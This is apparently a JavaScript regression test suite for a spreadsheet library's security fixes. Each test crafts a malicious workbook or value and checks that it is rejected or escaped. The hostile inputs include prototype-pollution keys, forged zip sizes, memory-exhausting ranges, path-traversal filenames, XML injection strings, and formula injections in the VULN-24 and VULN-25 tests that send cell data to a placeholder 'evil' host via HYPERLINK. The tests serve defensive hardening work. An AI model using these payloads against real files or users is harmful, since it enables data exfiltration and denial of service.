// Crafted-file regression tests for the 2026-10-14 audit (see audit/2026-10-14/vuln-track.md).
const fs = require('fs');
const os = require('os');
const path = require('path');
const {PassThrough} = require('stream');
const JSZip = require('jszip');
const {ExcelJS, PNG_1X1, roundTrip} = require('../../utils/roundtrip');
const {escapeCsvFormulaValue} = require('../../../lib/utils/csv-formula-guard');
const {safeJoin} = require('../../../lib/utils/media-path-guard');
const Range = require('../../../lib/doc/range');
const colCache = require('../../../lib/utils/col-cache');
const {slideFormula} = require('../../../lib/utils/shared-formula');

async function craft(patches) {
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet('S');
  ws.getCell('A1').value = 1;
  ws.getColumn(1).width = 10;
  ws.mergeCells('C1:D2');
  ws.getCell('F1').dataValidation = {type: 'list', allowBlank: true, formulae: ['"a,b"']};
  wb.definedNames.add('S!$A$1', 'seed');
  const zip = await JSZip.loadAsync(await wb.xlsx.writeBuffer());
  await Promise.all(
    Object.keys(patches).map(async name => {
      zip.file(name, patches[name](await zip.file(name).async('string')));
    })
  );
  return zip.generateAsync({type: 'nodebuffer', compression: 'DEFLATE'});
}

const load = async (buffer, options) => {
  const wb = new ExcelJS.Workbook();
  await wb.xlsx.load(buffer, options);
  return wb;
};

describe('hardening regression: crafted files (audit 2026-10-14)', () => {
  afterEach(() => {
    expect(Object.keys(Object.prototype)).to.deep.equal([]);
  });

  it('VULN-01: definedName on a "__proto__" sheet does not pollute Object.prototype', async () => {
    const buffer = await craft({
      'xl/workbook.xml': s =>
        s.replace('</definedNames>', '<definedName name="x">__proto__!$A$1:$A$3</definedName></definedNames>'),
    });
    await load(buffer);
    expect({}[2]).to.equal(undefined);
  });

  describe('VULN-04: <col> bounds', () => {
    const withCols = cols => craft({'xl/worksheets/sheet1.xml': s => s.replace(/<cols>[\s\S]*?<\/cols>/, `<cols>${cols}</cols>`)});

    it('clamps an absurd max to the Excel limit instead of allocating 300M columns', async () => {
      const wb = await load(await withCols('<col min="1" max="300000000" width="12" customWidth="1"/>'));
      const ws = wb.getWorksheet('S');
      expect(ws.columns).to.have.length(16384);
      expect(ws.getColumn(16384).width).to.equal(12);
    });

    it('ignores a col whose min is beyond the Excel limit', async () => {
      const wb = await load(
        await withCols('<col min="1" max="2" width="12" customWidth="1"/><col min="300000000" max="300000001" width="9" customWidth="1"/>')
      );
      // 4 = A..D, created by the C1:D2 merge of the base file; the out-of-range <col> adds nothing
      expect(wb.getWorksheet('S').columns).to.have.length(4);
    });

    it('still accepts the full-width range written by Excel itself', async () => {
      const wb = await load(await withCols('<col min="1" max="16384" width="20" customWidth="1"/>'));
      expect(wb.getWorksheet('S').columns).to.have.length(16384);
      expect(wb.getWorksheet('S').getColumn(5).width).to.equal(20);
    });
  });

  describe('VULN-03: mergeCell size', () => {
    const withMerge = (ref, extra) =>
      craft({'xl/worksheets/sheet1.xml': s => s.replace(/<mergeCell ref="[^"]*"\/>/, `<mergeCell ref="${ref}"/>`)}).then(b =>
        load(b, extra)
      );

    it('rejects a full-sheet merge instead of crashing the process with an OOM', async () => {
      let error;
      try {
        await withMerge('A1:XFD1048576');
      } catch (e) {
        error = e;
      }
      expect(error, 'load() must reject').to.be.an('error');
      expect(error.message).to.contain('maxMergeCells');
    });

    it('still accepts a whole-column merge', async function() {
      this.timeout(20000);
      const wb = await withMerge('A1:A1048576');
      expect(wb.getWorksheet('S').getCell('A2').isMerged).to.equal(true);
    });

    it('limit is configurable through load options', async () => {
      let error;
      try {
        await withMerge('A1:A1000', {maxMergeCells: 500});
      } catch (e) {
        error = e;
      }
      expect(error).to.be.an('error');
      const wb = await withMerge('A1:A1000', {maxMergeCells: 5000});
      expect(wb.getWorksheet('S').getCell('A500').isMerged).to.equal(true);
    });
  });

  describe('VULN-05: dataValidation sqref size', () => {
    const withSqref = (sqref, extra) =>
      craft({'xl/worksheets/sheet1.xml': s => s.replace(/sqref="[^"]*"/, `sqref="${sqref}"`)}).then(b => load(b, extra));

    it('rejects a full-sheet sqref instead of crashing the process with an OOM', async () => {
      let error;
      try {
        await withSqref('A1:XFD1048576');
      } catch (e) {
        error = e;
      }
      expect(error, 'load() must reject').to.be.an('error');
      expect(error.message).to.contain('maxDataValidationCells');
    });

    it('rejects the same range split across many sqref entries (cumulative budget)', async () => {
      const many = Array.from({length: 20}, (_, i) => `A${(i * 10) + 1}:XFD${(i * 10) + 1000000}`).join(' ');
      let error;
      try {
        await withSqref(many);
      } catch (e) {
        error = e;
      }
      expect(error).to.be.an('error');
    });

    it('still accepts a whole-column validation such as A2:A1048576', async function() {
      this.timeout(20000);
      const wb = await withSqref('A2:A1048576');
      expect(wb.getWorksheet('S').getCell('A1048576').dataValidation.type).to.equal('list');
    });
  });

  describe('VULN-02: forged declared size in the zip central directory', () => {
    // Builds a zip whose entry really inflates to `realBytes` but declares `declared` bytes.
    async function forged(realBytes, declared) {
      const wb = new ExcelJS.Workbook();
      wb.addWorksheet('S').getCell('A1').value = 1;
      const zip = await JSZip.loadAsync(await wb.xlsx.writeBuffer());
      zip.file('xl/media/image1.png', Buffer.alloc(realBytes), {compression: 'DEFLATE'});
      const buf = await zip.generateAsync({type: 'nodebuffer', compression: 'DEFLATE'});
      for (let i = 0; i < buf.length - 46; i++) {
        if (buf.readUInt32LE(i) === 0x02014b50) {
          const n = buf.readUInt16LE(i + 28);
          if (buf.toString('utf8', i + 46, i + 46 + n) === 'xl/media/image1.png') buf.writeUInt32LE(declared, i + 24);
        }
      }
      return buf;
    }

    it('aborts on the real size when the declared size is forged (per-entry limit)', async () => {
      const buf = await forged(4 * 1024 * 1024, 10);
      let error;
      try {
        await load(buf, {maxEntryUncompressedSize: 1024 * 1024});
      } catch (e) {
        error = e;
      }
      expect(error, 'load() must reject').to.be.an('error');
      expect(error.message).to.contain('actual uncompressed size');
    });

    it('aborts on the real cumulative size (archive-wide limit)', async () => {
      const buf = await forged(4 * 1024 * 1024, 10);
      let error;
      try {
        await load(buf, {maxTotalUncompressedSize: 1024 * 1024});
      } catch (e) {
        error = e;
      }
      expect(error, 'load() must reject').to.be.an('error');
      expect(error.message).to.contain('cumulative actual uncompressed size');
    });

    it('still loads a legitimate file whose entry is larger than a few chunks', async () => {
      const buf = await forged(8 * 1024 * 1024, 8 * 1024 * 1024);
      const wb = await load(buf, {maxEntryUncompressedSize: 16 * 1024 * 1024});
      expect(wb.getWorksheet('S').getCell('A1').value).to.equal(1);
    });
  });

  describe('VULN-06: definedName range size', () => {
    const withName = (ref, extra) =>
      craft({
        'xl/workbook.xml': s => s.replace('</definedNames>', `<definedName name="big">${ref}</definedName></definedNames>`),
      }).then(b => load(b, extra));

    it('rejects a full-sheet defined name instead of crashing the process with an OOM', async () => {
      let error;
      try {
        await withName('S!$A$1:$XFD$1048576');
      } catch (e) {
        error = e;
      }
      expect(error, 'load() must reject').to.be.an('error');
      expect(error.message).to.contain('maxDefinedNameCells');
    });

    it('still accepts whole-column / whole-row / single-column defined names', async function() {
      this.timeout(20000);
      for (const ref of ['S!$A$1:$A$1048576', 'S!$A:$A', 'S!$1:$1']) {
        // eslint-disable-next-line no-await-in-loop
        const wb = await withName(ref);
        // `$A:$A` / `$1:$1` are not expanded by DefinedNames (pre-existing behaviour): only check they load
        if (ref.includes('$1048576')) expect(wb.definedNames.getRanges('big').ranges, ref).to.have.length(1);
      }
    });

    it('limit is configurable through load options', async () => {
      let error;
      try {
        await withName('S!$A$1:$A$1000', {maxDefinedNameCells: 500});
      } catch (e) {
        error = e;
      }
      expect(error).to.be.an('error');
      const wb = await withName('S!$A$1:$A$1000', {maxDefinedNameCells: 5000});
      expect(wb.definedNames.getRanges('big').ranges).to.have.length(1);
    });
  });

  describe('VULN-07: streaming reader limits (opt-in)', () => {
    async function xlsxWithBigEntry(bytes) {
      const wb = new ExcelJS.Workbook();
      wb.addWorksheet('S').getCell('A1').value = 'hello';
      const zip = await JSZip.loadAsync(await wb.xlsx.writeBuffer());
      zip.file('xl/media/image1.png', Buffer.alloc(bytes), {compression: 'DEFLATE'});
      return zip.generateAsync({type: 'nodebuffer', compression: 'DEFLATE'});
    }
    const readAll = async (buffer, options) => {
      const input = new PassThrough();
      input.end(buffer);
      const reader = new ExcelJS.stream.xlsx.WorkbookReader(input, {worksheets: 'emit', sharedStrings: 'cache', ...options});
      const values = [];
      for await (const ws of reader) {
        for await (const row of ws) values.push(row.getCell(1).value);
      }
      return values;
    };

    it('rejects an entry whose real size exceeds maxEntryUncompressedSize', async () => {
      const buf = await xlsxWithBigEntry(4 * 1024 * 1024);
      let error;
      try {
        await readAll(buf, {maxEntryUncompressedSize: 1024 * 1024});
      } catch (e) {
        error = e;
      }
      expect(error, 'iteration must reject').to.be.an('error');
      expect(error.message).to.contain('maxEntryUncompressedSize');
    });

    it('rejects when the real cumulative size exceeds maxTotalUncompressedSize', async () => {
      const buf = await xlsxWithBigEntry(4 * 1024 * 1024);
      let error;
      try {
        await readAll(buf, {maxTotalUncompressedSize: 1024 * 1024});
      } catch (e) {
        error = e;
      }
      expect(error).to.be.an('error');
      expect(error.message).to.contain('maxTotalUncompressedSize');
    });

    it('has no limit by default (large files keep working) and works with generous limits', async () => {
      const buf = await xlsxWithBigEntry(4 * 1024 * 1024);
      expect(await readAll(buf)).to.deep.equal(['hello']);
      expect(await readAll(buf, {maxEntryUncompressedSize: 64 * 1024 * 1024, maxTotalUncompressedSize: 128 * 1024 * 1024})).to.deep.equal([
        'hello',
      ]);
    });
  });

  describe('VULN-08: streaming WorkbookWriter#addImage media path', () => {
    const newWriter = () => new ExcelJS.stream.xlsx.WorkbookWriter({stream: new PassThrough().on('data', () => {})});

    it('rejects parent-directory traversal like Workbook#addImage does', () => {
      expect(() => newWriter().addImage({filename: '../../../../etc/hostname', extension: 'png'})).to.throw(/traversal/);
      expect(() => new ExcelJS.Workbook().addImage({filename: '../../../../etc/hostname', extension: 'png'})).to.throw(
        /traversal/
      );
    });

    it('still accepts buffers, absolute paths and plain relative paths', async () => {
      const wb = newWriter();
      expect(wb.addImage({buffer: Buffer.from('x'), extension: 'png'})).to.equal(0);
      expect(wb.addImage({filename: '/etc/hostname', extension: 'png'})).to.equal(1);
      expect(wb.addImage({filename: 'logo.png', extension: 'png'})).to.equal(2);
    });
  });

  describe('VULN-09: slideFormula on a very long formula', () => {
    it('returns an over-long formula unchanged, in linear time', () => {
      const formula = '-'.repeat(100000);
      const start = Date.now();
      expect(slideFormula(formula, 'A1', 'B2')).to.equal(formula);
      expect(Date.now() - start).to.be.below(500); // ~5000 ms without the length cap
    });

    it('still slides normal formulas', () => {
      expect(slideFormula('SUM(A1:B2)+$C3+Sheet1!D4', 'A1', 'B2')).to.equal('SUM(B2:C3)+$C4+Sheet1!E5');
    });
  });

  describe('VULN-10: CSV formula after an embedded separator', () => {
    const csvOf = async (rows, options) => {
      const wb = new ExcelJS.Workbook();
      wb.addWorksheet('S').addRows(rows);
      return (await wb.csv.writeBuffer(options)).toString();
    };

    it('neutralises a trigger character right after ";", tab or "|"', () => {
      expect(escapeCsvFormulaValue('x;=1+1')).to.equal('\'x;=1+1');
      expect(escapeCsvFormulaValue('x\t@y')).to.equal('\'x\t@y');
      expect(escapeCsvFormulaValue('a|-b')).to.equal('\'a|-b');
    });

    it('leaves ordinary text, dashes and e-mail addresses untouched', () => {
      ['plain text', '12-34', 'e-mail: a@b.c', 'a;b', 'a; b', 'tags: a|b', 'a,=2'].forEach(v => {
        expect(escapeCsvFormulaValue(v), v).to.equal(v);
      });
    });

    it('applies to the CSV output, and escapeFormulas:false still opts out', async () => {
      expect(await csvOf([['x;=1+1', 'ok']])).to.equal('\'x;=1+1,ok');
      expect(await csvOf([['x;=1+1']], {escapeFormulas: false})).to.equal('x;=1+1');
    });
  });

  describe('VULN-11: pivot table XML escaping', () => {
    it('escapes header names and cell values in the pivot cache', async () => {
      const wb = new ExcelJS.Workbook();
      const src = wb.addWorksheet('Source');
      src.addRows([['A', 'B"/><hdr x="1', 'V'], ['a"/><injected foo="1', 'R&D <x>', 4], ['it\'s', 'plain', 5]]);
      wb.addWorksheet('Pivot').addPivotTable({sourceSheet: src, rows: ['A'], columns: ['B"/><hdr x="1'], values: ['V'], metric: 'sum'});
      const zip = await JSZip.loadAsync(await wb.xlsx.writeBuffer());
      const xml = await zip.file('xl/pivotCache/pivotCacheDefinition1.xml').async('string');
      expect(xml).to.not.contain('<injected');
      expect(xml).to.not.contain('<hdr');
      expect(xml).to.contain('v="a&quot;/&gt;&lt;injected foo=&quot;1"');
      expect(xml).to.contain('name="B&quot;/&gt;&lt;hdr x=&quot;1"');
      expect(xml).to.contain('v="R&amp;D &lt;x&gt;"');
      expect(xml).to.contain('v="it&apos;s"');
    });
  });

  describe('VULN-12: image.extension allow-list', () => {
    const streamWriter = () => new ExcelJS.stream.xlsx.WorkbookWriter({stream: new PassThrough().on('data', () => {})});

    it('rejects path-like and markup-like extensions in both writers', () => {
      ['png/../../../../tmp/zipslip', 'png"/><Relationship', 'p ng', '', 'toolongext', 5].forEach(extension => {
        expect(() => new ExcelJS.Workbook().addImage({buffer: PNG_1X1, extension}), String(extension)).to.throw(/Invalid image extension/);
        expect(() => streamWriter().addImage({buffer: PNG_1X1, extension}), String(extension)).to.throw(/Invalid image extension/);
      });
    });

    it('accepts the usual extensions, in any case', () => {
      ['png', 'PNG', 'jpeg', 'jpg', 'gif', 'webp', 'tiff', 'svg', 'emf'].forEach(extension => {
        expect(new ExcelJS.Workbook().addImage({buffer: PNG_1X1, extension})).to.equal(0);
        expect(streamWriter().addImage({buffer: PNG_1X1, extension})).to.equal(0);
      });
    });
  });

  describe('VULN-13: CSV cells named like Object.prototype members', () => {
    it('keeps them as text, and the workbook can still be written', async () => {
      const wb = new ExcelJS.Workbook();
      const input = new PassThrough();
      input.end('constructor,toString,__proto__,hasOwnProperty,valueOf,#N/A,true,false\n');
      const ws = await wb.csv.read(input);
      const values = [1, 2, 3, 4, 5, 6, 7, 8].map(c => ws.getRow(1).getCell(c).value);
      expect(values).to.deep.equal(['constructor', 'toString', '__proto__', 'hasOwnProperty', 'valueOf', {error: '#N/A'}, true, false]);
      const wb2 = await roundTrip(wb);
      expect(wb2.worksheets[0].getCell('A1').value).to.equal('constructor');
    });
  });

  describe('VULN-14: safeJoin and symbolic links', () => {
    let root;
    let base;
    before(() => {
      root = fs.mkdtempSync(path.join(os.tmpdir(), 'safejoin-'));
      base = path.join(root, 'release1');
      fs.mkdirSync(path.join(base, 'sub'), {recursive: true});
      fs.writeFileSync(path.join(base, 'ok.png'), 'x');
      fs.writeFileSync(path.join(root, 'secret.txt'), 's');
      fs.symlinkSync(path.join(root, 'secret.txt'), path.join(base, 'link.png'));
      fs.symlinkSync(root, path.join(base, 'dirlink'));
      fs.symlinkSync(path.join(base, 'sub'), path.join(base, 'inner'));
      fs.symlinkSync(path.join(root, 'nonexistent'), path.join(base, 'dangling.png'));
      fs.symlinkSync(base, path.join(root, 'current'));
    });
    after(() => fs.rmSync(root, {recursive: true, force: true}));

    it('refuses a link inside the base that points outside of it', () => {
      expect(() => safeJoin(base, 'link.png')).to.throw(/outside the base directory/);
      expect(() => safeJoin(base, 'dirlink/secret.txt')).to.throw(/outside the base directory/);
      expect(() => safeJoin(base, 'dangling.png')).to.throw(/dangling symbolic link/);
    });

    it('still accepts regular files, missing files, inner links and a symlinked base', () => {
      expect(safeJoin(base, 'ok.png')).to.equal(path.join(base, 'ok.png'));
      expect(safeJoin(base, 'sub/not-yet.png')).to.equal(path.join(base, 'sub', 'not-yet.png'));
      expect(safeJoin(base, 'inner')).to.equal(path.join(base, 'inner'));
      expect(safeJoin(path.join(root, 'current'), 'ok.png')).to.equal(path.join(root, 'current', 'ok.png'));
      expect(safeJoin(path.join(root, 'missing-base'), 'a/b.png')).to.equal(path.join(root, 'missing-base', 'a', 'b.png'));
    });
  });

  describe('VULN-16: x14 conditional formatting ids', () => {
    ['__proto__', 'constructor', 'prototype', 'toString'].forEach(id => {
      it(`does not pollute Object.prototype when the x14 rule id is "${id}"`, async () => {
        const wb = new ExcelJS.Workbook();
        const ws = wb.addWorksheet('S');
        ws.addRows([[1, 2], [3, 4]]);
        ws.addConditionalFormatting({
          ref: 'A1:B2',
          rules: [{type: 'dataBar', cfvo: [{type: 'min'}, {type: 'max'}], color: {argb: 'FF638EC6'}, gradient: false, priority: 1}],
        });
        const zip = await JSZip.loadAsync(await wb.xlsx.writeBuffer());
        const name = 'xl/worksheets/sheet1.xml';
        const xml = (await zip.file(name).async('string')).replace(/(<x14:cfRule[^>]* id=")[^"]*(")/, `$1${id}$2`);
        expect(xml).to.contain(`id="${id}"`);
        zip.file(name, xml);
        const loaded = await load(await zip.generateAsync({type: 'nodebuffer'}));
        expect(({}).type).to.equal(undefined);
        expect(loaded.getWorksheet('S').conditionalFormattings).to.have.length(1);
      });
    });
  });

  describe('VULN-17: sheetId bound', () => {
    const withSheetId = id => craft({'xl/workbook.xml': s => s.replace(/sheetId="\d+"/, `sheetId="${id}"`)}).then(load);

    it('rejects a huge sheetId instead of building a huge sparse array', async () => {
      let error;
      try {
        await withSheetId(100000000);
      } catch (e) {
        error = e;
      }
      expect(error, 'load() must reject').to.be.an('error');
      expect(error.message).to.contain('sheetId');
    });

    it('accepts ordinary and large-but-plausible sheet ids', async () => {
      expect((await withSheetId(3)).worksheets).to.have.length(1);
      expect((await withSheetId(1000000)).worksheets).to.have.length(1);
    });
  });

  describe('VULN-18: row number bound', () => {
    const withRow = r => craft({'xl/worksheets/sheet1.xml': s => s.replace(/(<row [^>]*r=")\d+(")/, `$1${r}$2`)}).then(load);

    it('rejects a row number beyond the Excel limit', async () => {
      let error;
      try {
        await withRow(20000000);
      } catch (e) {
        error = e;
      }
      expect(error, 'load() must reject').to.be.an('error');
      expect(error.message).to.contain('row number');
    });

    it('accepts the last Excel row', async () => {
      const wb = await withRow(1048576);
      expect(wb.getWorksheet('S').getRow(1048576).getCell(1).value).to.equal(1);
    });
  });

  describe('VULN-19: drawing anchor bounds', () => {
    const withAnchor = async (tag, value) => {
      const wb = new ExcelJS.Workbook();
      wb.addWorksheet('S').addImage(wb.addImage({buffer: PNG_1X1, extension: 'png'}), 'B2:D4');
      const zip = await JSZip.loadAsync(await wb.xlsx.writeBuffer());
      const name = 'xl/drawings/drawing1.xml';
      const xml = (await zip.file(name).async('string')).replace(new RegExp(`<xdr:${tag}>\\d+</xdr:${tag}>`), `<xdr:${tag}>${value}</xdr:${tag}>`);
      expect(xml).to.contain(`<xdr:${tag}>${value}</xdr:${tag}>`);
      zip.file(name, xml);
      return load(await zip.generateAsync({type: 'nodebuffer'}));
    };

    it('rejects an anchor beyond the Excel limits instead of allocating millions of columns', async () => {
      let error;
      try {
        await withAnchor('col', 300000000);
      } catch (e) {
        error = e;
      }
      expect(error, 'load() must reject').to.be.an('error');
      expect(error.message).to.contain('Invalid drawing anchor');
      let rowError;
      try {
        await withAnchor('row', 1048577);
      } catch (e) {
        rowError = e;
      }
      expect(rowError).to.be.an('error');
    });

    it('accepts anchors on the last column / row (including the far edge)', async () => {
      expect((await withAnchor('col', 16384)).getWorksheet('S').getImages()[0].range.tl.col).to.equal(16384);
      expect((await withAnchor('row', 1048576)).getWorksheet('S').getImages()).to.have.length(1);
    });
  });

  describe('VULN-21: apostrophes in sheet names', () => {
    it('serialises a quote in a sheet name the way Excel expects, and decodes it back', () => {
      expect(new Range(1, 1, 2, 2, 'Bob\'s data').range).to.equal('\'Bob\'\'s data\'!A1:B2');
      expect(colCache.decodeEx('\'Bob\'\'s data\'!A1:B2').sheetName).to.equal('Bob\'s data');
      expect(new Range('\'Bob\'\'s data\'!A1:B2').range).to.equal('\'Bob\'\'s data\'!A1:B2');
      expect(new Range(1, 1, 2, 2, 'Sheet1').range).to.equal('Sheet1!A1:B2');
      expect(new Range(1, 1, 2, 2, 'My Sheet').range).to.equal('\'My Sheet\'!A1:B2');
    });

    it('defined names on such a sheet are stable over repeated round trips', async () => {
      const wb = new ExcelJS.Workbook();
      wb.addWorksheet('Bob\'s data').getCell('A1').value = 1;
      wb.definedNames.add('\'Bob\'\'s data\'!$A$1:$A$2', 'nm');
      const wb3 = await roundTrip(await roundTrip(wb));
      expect(wb3.definedNames.getRanges('nm').ranges).to.deep.equal(['\'Bob\'\'s data\'!$A$1:$A$2']);
      expect(wb3.definedNames.getNames('\'Bob\'\'s data\'!A1')).to.deep.equal(['nm']);
    });

    it('streaming mergeCells cannot inject XML through the sheet name', async () => {
      const chunks = [];
      const out = new PassThrough().on('data', c => chunks.push(c));
      const writer = new ExcelJS.stream.xlsx.WorkbookWriter({stream: out});
      const ws = writer.addWorksheet('S');
      const row = ws.addRow([1]);
      ws.mergeCells(1, 1, 2, 2, 'x\'"/><injected/><a b="\'');
      row.commit();
      await ws.commit();
      await writer.commit();
      const xml = await (await JSZip.loadAsync(Buffer.concat(chunks))).file('xl/worksheets/sheet1.xml').async('string');
      expect(xml).to.not.contain('<injected');
      expect(xml).to.contain('<mergeCells count="1">');
    });
  });

  describe('VULN-22 / VULN-23: streaming reader cleanup and corrupt entries', () => {
    const tmpFiles = () => fs.readdirSync(os.tmpdir()).filter(f => /^tmp-/.test(f)).length;

    // 20 sheets, written before sharedStrings.xml: the reader defers each of them to a temp file
    async function manySheets(mutate) {
      const wb = new ExcelJS.Workbook();
      for (let i = 1; i <= 20; i++) wb.addWorksheet(`S${i}`).addRow([i, `x${i}`]);
      const zip = await JSZip.loadAsync(await wb.xlsx.writeBuffer());
      if (mutate.malformed) zip.file('xl/worksheets/sheet1.xml', '<worksheet><sheetData><row r="1"><c r="A1"><v>1</row></sheetData>');
      const buffer = await zip.generateAsync({type: 'nodebuffer', compression: 'DEFLATE'});
      if (mutate.corrupt) {
        const name = Buffer.from('xl/worksheets/sheet1.xml');
        const start = buffer.indexOf(name) + name.length;
        for (let i = 4; i < 30; i++) buffer[start + i] ^= 0xff; // eslint-disable-line no-bitwise
      }
      return buffer;
    }
    const iterate = async (buffer, onSheet) => {
      const input = new PassThrough();
      input.end(buffer);
      const reader = new ExcelJS.stream.xlsx.WorkbookReader(input, {worksheets: 'emit', sharedStrings: 'cache'});
      let count = 0;
      for await (const ws of reader) {
        count++;
        for await (const row of ws) row.getCell(1); // eslint-disable-line no-unused-expressions
        if (onSheet && onSheet(count)) break;
      }
      return count;
    };
    const settle = () => new Promise(resolve => setTimeout(resolve, 300));

    it('removes the temp files when a sheet is malformed', async () => {
      const buffer = await manySheets({malformed: true});
      const before = tmpFiles();
      let error;
      try {
        await iterate(buffer);
      } catch (e) {
        error = e;
      }
      await settle();
      expect(error, 'iteration must reject').to.be.an('error');
      expect(tmpFiles()).to.be.at.most(before);
    });

    it('removes the temp files when the consumer stops iterating early', async () => {
      const buffer = await manySheets({});
      const before = tmpFiles();
      expect(await iterate(buffer, count => count === 2)).to.equal(2);
      await settle();
      expect(tmpFiles()).to.be.at.most(before);
    });

    it('rejects (instead of never settling) on a corrupt deflate stream', async function() {
      this.timeout(8000);
      const buffer = await manySheets({corrupt: true});
      const before = tmpFiles();
      let error;
      try {
        await iterate(buffer);
      } catch (e) {
        error = e;
      }
      await settle();
      expect(error, 'iteration must reject').to.be.an('error');
      expect(tmpFiles()).to.be.at.most(before);
    });

    it('still reads every sheet of a healthy file', async () => {
      expect(await iterate(await manySheets({}))).to.equal(20);
      await settle();
    });
  });

  describe('VULN-24: table totals row formula', () => {
    const totalsFormula = async name => {
      const wb = new ExcelJS.Workbook();
      wb.addWorksheet('S').addTable({
        name: 'T',
        ref: 'A1',
        headerRow: true,
        totalsRow: true,
        columns: [{name: 'k'}, {name, totalsRowFunction: 'sum'}],
        rows: [['a', 1], ['b', 2]],
      });
      const xml = await (await JSZip.loadAsync(await wb.xlsx.writeBuffer())).file('xl/worksheets/sheet1.xml').async('string');
      return xml.match(/<f>([^<]*)<\/f>/)[1].replace(/&apos;/g, '\'').replace(/&quot;/g, '"');
    };

    it('leaves ordinary column names untouched', async () => {
      expect(await totalsFormula('Amount')).to.equal('SUBTOTAL(109,T[Amount])');
      expect(await totalsFormula('Unit price')).to.equal('SUBTOTAL(109,T[Unit price])');
    });

    it('escapes [ ] # and \' so that a column name cannot leave the structured reference', async () => {
      expect(await totalsFormula('It\'s [x] #1')).to.equal('SUBTOTAL(109,T[It\'\'s \'[x\'] \'#1])');
      const evil = await totalsFormula('Amount])+HYPERLINK("http://evil/?"&A2,"x")+SUM(T[Amount');
      // once escaped brackets are removed, the only ] left is the one closing the reference
      const bare = evil.replace(/'[[\]#']/g, '');
      expect(bare.indexOf(']')).to.equal(bare.length - 2);
      expect(evil).to.contain('T[Amount\'])+HYPERLINK');
    });
  });

  describe('VULN-25: conditional formatting containsText', () => {
    const textFormula = async text => {
      const wb = new ExcelJS.Workbook();
      const ws = wb.addWorksheet('S');
      ws.addRows([['hello'], ['x']]);
      ws.addConditionalFormatting({
        ref: 'A1:A2',
        rules: [{type: 'containsText', operator: 'containsText', text, style: {font: {bold: true}}, priority: 1}],
      });
      const xml = await (await JSZip.loadAsync(await wb.xlsx.writeBuffer())).file('xl/worksheets/sheet1.xml').async('string');
      return xml.match(/<formula>([^<]*)<\/formula>/)[1].replace(/&quot;/g, '"').replace(/&amp;/g, '&');
    };

    it('writes ordinary text as before', async () => {
      expect(await textFormula('hello')).to.equal('NOT(ISERROR(SEARCH("hello",A1)))');
    });

    it('doubles double quotes so the text stays inside the string literal', async () => {
      expect(await textFormula('say "hi"')).to.equal('NOT(ISERROR(SEARCH("say ""hi""",A1)))');
      expect(await textFormula('a")),HYPERLINK("http://evil","x")&("')).to.equal(
        'NOT(ISERROR(SEARCH("a"")),HYPERLINK(""http://evil"",""x"")&(""",A1)))'
      );
    });
  });

  describe('VULN-26: invalid dcterms:created', () => {
    const withCreated = created =>
      craft({'docProps/core.xml': s => s.replace(/<dcterms:created[\s\S]*?<\/dcterms:created>/, created)}).then(load);

    it('can be written back when the date is garbage or empty', async () => {
      for (const created of [
        '<dcterms:created xsi:type="dcterms:W3CDTF">garbage</dcterms:created>',
        '<dcterms:created xsi:type="dcterms:W3CDTF"></dcterms:created>',
      ]) {
        // eslint-disable-next-line no-await-in-loop
        const wb = await withCreated(created);
        expect(Number.isNaN(wb.created.getTime())).to.equal(true);
        // eslint-disable-next-line no-await-in-loop
        const rewritten = await roundTrip(wb);
        expect(rewritten.worksheets).to.have.length(1);
      }
    });

    it('still writes a valid date unchanged', async () => {
      const wb = await withCreated('<dcterms:created xsi:type="dcterms:W3CDTF">2024-05-06T07:08:09Z</dcterms:created>');
      expect((await roundTrip(wb)).created.toISOString()).to.equal('2024-05-06T07:08:09.000Z');
    });
  });
});
